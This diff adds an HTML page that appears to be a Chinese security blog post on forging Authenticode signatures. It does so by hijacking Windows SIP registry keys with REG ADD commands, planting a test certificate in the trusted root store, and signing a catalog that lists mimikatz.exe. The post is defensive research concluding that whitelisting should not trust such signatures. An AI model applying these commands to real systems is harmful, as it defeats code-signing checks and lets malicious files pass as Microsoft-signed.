@@ -1,0 +1,859 @@
+
+
+<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+	<script src="http://echarts.baidu.com/dist/echarts.common.min.js"></script>
+	<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+    </style>
+
+
+    
+
+    <title>Authenticode签名伪造——针对文件类型的签名伪造 | </title>
+    <meta name="author" content="wiki">
+    
+    <meta name="description" content="0x00 前言
+在上篇文章《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》介绍了针对单一文件的Authenticode签名伪造，需要在文件尾部添加伪造的签名数据，这次将介绍另一种签名伪造方式：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。
+注：
+本文介绍的">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="Authenticode签名伪造——针对文件类型的签名伪造"/>
+    <meta property="og:site_name" content="wiki"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="wiki" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/lastest.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<style>
+
+</style>
+<body style="background-color:#2196f3">
+
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js"></script>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo darken-1">
+    
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">wiki</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-2" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://p4gdp8beq.bkt.clouddn.com/timgsi1.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">wiki</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-2" id="category-menu">
+    
+
+            
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+<div class="container main-container">
+    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo darken-2">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+	<!-- 添加渲染 -->
+	<div id="toc" class="toc-article">
+		<strong class="toc-title"></strong>
+	</div> 
+        <div class="card-content">
+		  
+			
+            
+
+            <div class="article-title">
+                
+    
+        <h1>Authenticode签名伪造——针对文件类型的签名伪造</h1>
+    
+
+
+            </div>
+            <time class="red-link-context" datetime="2018-05-25T13:03:44.750Z"><a href="">2018-05-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+
+            <div class="toc red-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00-前言"><span class="section table-of-contents-text">0x00 前言</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-简介"><span class="section table-of-contents-text">0x01 简介</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-针对powershell脚本的签名伪造方法"><span class="section table-of-contents-text">0x02 针对powershell脚本的签名伪造方法</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-针对PE文件的签名伪造方法"><span class="section table-of-contents-text">0x03 针对PE文件的签名伪造方法</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-针对cat文件的签名伪造方法"><span class="section table-of-contents-text">0x04 针对cat文件的签名伪造方法</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-小结"><span class="section table-of-contents-text">0x05 小结</span></a></li></ol>
+</div>
+
+
+            <div class="entry red-link-context">
+                <script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr>
+<p>在上篇文章《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》介绍了针对单一文件的Authenticode签名伪造，需要在文件尾部添加伪造的签名数据，这次将介绍另一种签名伪造方式：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。</p>
+<p><strong>注：</strong></p>
+<p>本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。</p>
+<p><strong>参考资料：</strong></p>
+<p><a href="https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf" target="_blank" rel="noopener">https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf</a></p>
+<p><a href="http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html" target="_blank" rel="noopener">http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html</a></p>
+<p><a href="https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view" target="_blank" rel="noopener">https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view</a></p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>本文将要介绍以下内容：</p>
+<ul>
+<li>针对powershell脚本的签名伪造方法</li>
+<li>针对PE文件的签名伪造方法</li>
+<li>针对其他类型文件的签名伪造方法</li>
+<li>添加代码实现对特定文件的签名伪造</li>
+</ul>
+<h2 id="0x02-针对powershell脚本的签名伪造方法"><a href="#0x02-针对powershell脚本的签名伪造方法" class="headerlink" title="0x02 针对powershell脚本的签名伪造方法"></a>0x02 针对powershell脚本的签名伪造方法</h2><hr>
+<p>前提是powershell脚本需要包含一个签名(自己生成的签名会被识别为无效)，下面介绍如何将该无效签名伪造成有效的微软签名</p>
+<p>生成测试证书：</p>
+<pre><code>makecert -n &quot;CN=Microsoft Windows Test1&quot; -r -eku 1.3.6.1.5.5.7.3.3 -sv certtest.pvk certtest.cer
+cert2spc certtest.cer certtest.spc
+pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
+</code></pre><p>不需要注册该证书</p>
+<p><strong>注：</strong></p>
+<p>使用makecert.exe要加参数： <code>-eku 1.3.6.1.5.5.7.3.3</code></p>
+<p>否则提示证书无法用于代码签名，具体错误如下：</p>
+<p><code>Set-AuthenticodeSignature : Cannot sign code. The specified certificate is not
+suitable for code signing.</code></p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-1.png" alt="Alt text"></p>
+<p>给powershell脚本签名：</p>
+<pre><code>$cert = Get-PfxCertificate certtest.pfx
+Set-AuthenticodeSignature -Filepath 1.ps1 -Cert $cert
+</code></pre><p>验证证书：</p>
+<pre><code>Get-AuthenticodeSignature .\1.ps1
+</code></pre><p>提示<code>UnknownError</code>，表示文件签名无效</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-2.png" alt="Alt text"></p>
+<p>修改注册表，命令如下：</p>
+<pre><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;AutoApproveHash&quot; /f
+
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;GetLegitMSSignature&quot; /f
+</code></pre><p>再次验证：</p>
+<pre><code>Get-AuthenticodeSignature .\1.ps1
+</code></pre><p>显示<code>Valid</code>，签名有效</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-3.png" alt="Alt text"></p>
+<p><strong>注：</strong></p>
+<p>不同系统下相同名称的文件签名不同</p>
+<p><code>AFDD80C4EBF2F61D3943F18BB566D6AA6F6E5033</code>为Matt Graeber测试系统中的notepad.exe签名hash</p>
+<p>现在在我们自己的系统进行测试：<code>Win10 x64</code></p>
+<p>分别获取notepad.exe的签名信息：</p>
+<pre><code>Get-AuthenticodeSignature c:\windows\system32\notepad.exe
+</code></pre><pre><code>sigcheck -i C:\Windows\System32\notepad.exe
+</code></pre><p>可以发现sigcheck的输出内容中，<code>Thumbprint</code>对应文件签名hash，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-1.png" alt="Alt text"></p>
+<p>接下来，将测试系统改为<code>Win7 x86</code></p>
+<p>在Win7下使用<code>Get-AuthenticodeSignature</code>无法获得notepad.exe的签名信息(catalog签名)</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-2.png" alt="Alt text"></p>
+<p>但可以通过sigcheck获得，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-3.png" alt="Alt text"></p>
+<p>hash为：<code>018B222E21FBB2952304D04D1D87F736ED46DEA4</code></p>
+<p>定位cat文件路径：<code>C:\Windows\system32\CatRoot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\ntexe.cat</code></p>
+<p>.cat文件保存格式为ASN.1标准，直接通过记事本无法查看，需要解密，在线网址如下： </p>
+<p><a href="https://lapo.it/asn1js/" target="_blank" rel="noopener">https://lapo.it/asn1js/</a></p>
+<p>选择cat文件后即可解密显示完整格式</p>
+<p>格式解析可参考：</p>
+<p><a href="https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography</a></p>
+<p>将该文件替换PoCSubjectInterfacePackage工程中的<code>MS_cert.bin</code>，重新编译</p>
+<p>配置注册表</p>
+<p>打开一个新的cmd，查看powershell脚本签名：</p>
+<pre><code>Get-AuthenticodeSignature .\1.ps1
+</code></pre><p>同sighcheck获取的hash值保持一致，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-4.png" alt="Alt text"></p>
+<p>powershell脚本的Authenticode签名伪造成功</p>
+<p>对以上操作直观的理解：</p>
+<p><strong>该方法是通过修改系统证书验证过程，使文件将指定的catalog签名作为自己的Authenticode签名</strong></p>
+<p>当然，所有带签名的powershell脚本均会统一成hash为<code>018B222E21FBB2952304D04D1D87F736ED46DEA4</code>的签名，这就带来了一个问题：<strong>这样会影响正常系统文件的签名校验</strong></p>
+<p>我们可以看到，通过这种方式伪造的签名会作用于所有powershell脚本，那么，我们能否针对特定powershell脚本作伪造呢？</p>
+<p>以Matt Graeber开源的工程PoCSubjectInterfacePackage作为模板进行修改，下载地址如下：</p>
+<p><a href="https://github.com/mattifestation/PoCSubjectInterfacePackage" target="_blank" rel="noopener">https://github.com/mattifestation/PoCSubjectInterfacePackage</a></p>
+<p>重点关注函数<code>GetLegitMSSignature</code>，在线地址：</p>
+<p><a href="https://github.com/mattifestation/PoCSubjectInterfacePackage/blob/master/MySIP/MySIP.c#L138" target="_blank" rel="noopener">https://github.com/mattifestation/PoCSubjectInterfacePackage/blob/master/MySIP/MySIP.c#L138</a></p>
+<p>查看结构<code>SIP_SUBJECTINFO *pSubjectInfo</code>的参数说明，地址如下：</p>
+<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb736434(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/bb736434(v=vs.85).aspx</a></p>
+<p><code>pwsFileName</code>和<code>pwsDisplayName</code>均能够表示文件名称，所以可通过<code>MessageBox</code>进行验证</p>
+<p>函数<code>GetLegitMSSignature</code>内添加如下代码：</p>
+<pre><code>MessageBox (NULL, pSubjectInfo-&gt;pwsFileName, pSubjectInfo-&gt;pwsDisplayName,0);  
+</code></pre><p>进行测试，成功获得传入文件名，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-1.png" alt="Alt text"></p>
+<p>接下来的思路：</p>
+<p>对传入的文件名称进行判断，满足条件的文件加载对应的catalog签名，最终实现对特定文件的签名伪造</p>
+<p>筛选文件的代码如下：</p>
+<pre><code>if(lstrcmpi((LPCTSTR)pSubjectInfo-&gt;pwsFileName,L&quot;C:\\test\\cer\\1.ps1&quot;)==0)
+{
+    MessageBox (NULL,L&quot;Get selected file&quot;, (LPCTSTR)pSubjectInfo-&gt;pwsFileName,0) ;   
+}
+</code></pre><p>完整代码可参考：</p>
+<p><a href="https://raw.githubusercontent.com/3gstudent/test/master/MySIP.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/test/master/MySIP.c</a></p>
+<p>当前文件为<code>C:\test\cer\1.ps1</code>时，符合条件，进行签名伪造，否则放弃</p>
+<p>测试如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-2.png" alt="Alt text"></p>
+<p>成功实现对特定文件的签名伪造，这种方式的优点是不需要在文件尾部添加Authenticode签名，不改变文件hash</p>
+<p>当然，这仅仅是一个POC，还要对系统文件的签名验证做判断</p>
+<h2 id="0x03-针对PE文件的签名伪造方法"><a href="#0x03-针对PE文件的签名伪造方法" class="headerlink" title="0x03 针对PE文件的签名伪造方法"></a>0x03 针对PE文件的签名伪造方法</h2><hr>
+<p>参考这个列表：</p>
+<ul>
+<li>C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE</li>
+<li>DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog    .cat文件</li>
+<li>9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL .ctl文件</li>
+<li>C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet .cab文件</li>
+</ul>
+<p>如果替换exe文件的校验，即<code>CryptSIPDllVerifyIndirectData</code>和<code>CryptSIPDllGetSignedDataMsg</code>，命令如下：</p>
+<pre><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;AutoApproveHash&quot; /f
+
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;GetLegitMSSignature&quot; /f
+</code></pre><p>重启explorer.exe，所有的exe文件都包含hash为：<code>018B222E21FBB2952304D04D1D87F736ED46DEA4</code>的签名</p>
+<p>特别的地方：<strong>伪造的签名来自于cat文件，但是会以Authenticode签名的格式显示，通过文件属性能够看到签名信息(这是Authenticode签名的特性，catalog签名不具有该特性)</strong></p>
+<p>同样，修改原工程能够实现针对特定PE文件的签名伪造，方法不再赘述</p>
+<h2 id="0x04-针对cat文件的签名伪造方法"><a href="#0x04-针对cat文件的签名伪造方法" class="headerlink" title="0x04 针对cat文件的签名伪造方法"></a>0x04 针对cat文件的签名伪造方法</h2><hr>
+<p>如果对所有.cat文件的签名验证过程进行替换，再将其添加到安全编录数据库中，那么，包含catalog签名的PE文件是否也随即获得伪造签名呢？</p>
+<p>下面开始测试：</p>
+<p>新建文本文档cat.txt，内容如下：</p>
+<pre><code>[CatalogHeader]
+Name=makecat1.cat
+[CatalogFiles]
+&lt;hash&gt;ExeFile1=mimikatz.exe
+
+</code></pre><p><strong>注：</strong></p>
+<p>txt文件尾部需要一个空行，否则，在接下来的操作会报错，提示文件无法找到</p>
+<p>使用makecat.exe生成makecat1.cat：</p>
+<pre><code>makecat -v cat.txt
+</code></pre><p>为makecat1.cat添加伪造的Authenticode签名：</p>
+<pre><code>signtool sign /f certtest.pfx /p 123456 makecat1.cat
+</code></pre><p><strong>注：</strong></p>
+<p>certtest.pfx不能使用之前手动生成的证书，不能加参数： <code>-eku 1.3.6.1.5.5.7.3.3</code>，否则exe文件的catalog签名将会校验失败</p>
+<p>生成certtest.pfx的操作如下：</p>
+<pre><code>makecert -n &quot;CN=Microsoft Windows Test1&quot; -r -sv certtest.pvk certtest.cer
+cert2spc certtest.cer certtest.spc
+pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
+</code></pre><p>此处还需要将证书安装到“受信任的根证书颁发机构”存储区</p>
+<p>管理员权限：</p>
+<pre><code>certmgr.exe -add -c certtest.cer -s -r localmachine root
+</code></pre><p>否则，之后的签名验证会报错，提示证书链不可信</p>
+<p><strong>补充：</strong></p>
+<p>从“受信任的根证书颁发机构”存储区删除证书的操作为：</p>
+<p>(管理员权限)</p>
+<pre><code>certmgr.exe -del -c -n &quot;Windows Test1&quot; -s -r localMachine Root
+</code></pre><p>cat文件对应GUID:<code>DE351A43-8E59-11D0-8C47-00C04FC295EE</code></p>
+<p>替换注册表键值：</p>
+<pre><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;AutoApproveHash&quot; /f
+
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;GetLegitMSSignature&quot; /f
+</code></pre><p>重启explorer.exe，所有的cat文件签名均为<code>Microsoft Windows</code></p>
+<p>将makecat1.cat添加到系统的安全编录数据库：</p>
+<p>(管理员权限)</p>
+<pre><code>signtool catdb -v makecat1.cat
+</code></pre><p>最终，发现文件的catalog签名保持不变，无法进行伪造</p>
+<p>得出结论： <strong>这种方式无法对catalog签名进行伪造</strong></p>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><hr>
+<p>本文介绍了Authenticode签名伪造的另一种利用方法：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。</p>
+<p>经过这两篇文章的测试，得出最终结论：应谨慎对待系统的Authenticode签名，因为通过修改注册表或dll劫持等方式均能够伪造出微软签名，对此，白名单等防御机制不应盲目相信Authenticode签名过的文件。</p>
+<hr>
+<p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>
+
+                
+<p class="red-link-context">
+    <a href="5140417.html" rel="next" title="Catalog签名伪造——Long UNC文件名欺骗">
+    上一篇：Catalog签名伪造——Long UNC文件名欺骗
+  </a>
+</p>
+
+
+
+<p class="red-link-context">
+    <a href="7138bc2f.html" rel="next" title="Authenticode签名伪造——PE文件的签名伪造与签名验证劫持">
+    下一篇：Authenticode签名伪造——PE文件的签名伪造与签名验证劫持
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+	
+</article>
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style_32x32">
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_tqq"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a href="http://www.jiathis.com/share?uid=2157721" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=2157721" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!-- ������City�氲װ���� -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zNDIxOS8xMDc1Nw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> Ϊ����ʹ�����������۹����뼤��JavaScript</noscript>
+</div>
+<!-- City�氲װ��������� -->
+
+ 
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large red">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect brown" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse indigo"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>	
+  </div>
+	
+    </main>
+    
+  
+
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/spig.js"></script>
+<link rel="stylesheet" href="http://imagestp.cfyqy.com/cfyqy/pet/css/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+<div >
+<!--小人只在首页显示 start*-->
+<div id="spig" class="spig">
+    <div id="message">正在加载中……</div>
+    <div id="mumu" class="mumu"></div>
+</div>
+</div>
+<!--小人end*-->
+ 
+<footer class="page-footer indigo darken-1 darken-1">
+	
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+           
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+    <div class="footer-copyright red-link-context">
+        <div class="container">
+            © just do !
+        </div>
+    </div>
+	
+</footer>
+
+	
+
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>
+  <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
